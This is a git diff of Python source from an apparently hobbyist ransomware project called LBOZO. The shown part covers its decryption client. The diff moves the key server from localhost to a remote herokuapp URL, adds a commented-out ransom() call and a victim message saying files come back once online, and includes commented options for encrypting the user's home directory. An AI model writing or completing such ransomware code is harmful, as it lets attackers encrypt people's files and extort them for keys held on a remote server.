@@ -19,7 +19,7 @@ from utils import (
 if os.path.exists(ransomware_path + "\\LBOZO.exe"):
     os.remove(ransomware_path + "\\LBOZO.exe")
 
-server_address = "http://localhost:8000/decryptkey/"
+server_address = "https://lbozo-remote-server.herokuapp.com/decryptkey/"
 
 
 def send_to_server_encrypted_private_key(private_encrypted_key):
@@ -33,6 +33,7 @@ def send_to_server_encrypted_private_key(private_encrypted_key):
     private_key = ret.text
     return str(private_key)
 
+#ransom()
 
 decryptend = input("Decrypt? (y/n): ")
 if decryptend == "y" or "Y":
@@ -49,8 +50,7 @@ if decryptend == "y" or "Y":
             break
         except:
             print(
-                "No connection, sleeping for 2 minutes\nConnect \
-                  to internet to get your files back!"
+                "No connection, sleeping for 2 minutes\nConnect to the internet to get your files back!"
             )
             time.sleep(120)
 
@@ -69,14 +69,12 @@ if decryptend == "y" or "Y":
 
     removeFiles = True
 
-    #   drives = win32api.GetLogicalDriveStrings()
-    #   drives = drives.split('\000')[:-1]
+    #   userpath = os.path.expanduser('~')
 
     paths = ["C:\\Users\\noahs\\Desktop\\Repos\\LBOZO\\tests"]
 
     #   only append this path if you want to encrypt all files in your user directory(desktop, documents, downloads, etc.)
-    #   for drive in drives:
-    #       paths.append(drive)
+    #   paths.append(userpath)
 
     format = "%(asctime)s: %(message)s"
     logging.basicConfig(format=format, level=logging.INFO, datefmt="%H:%M:%S")
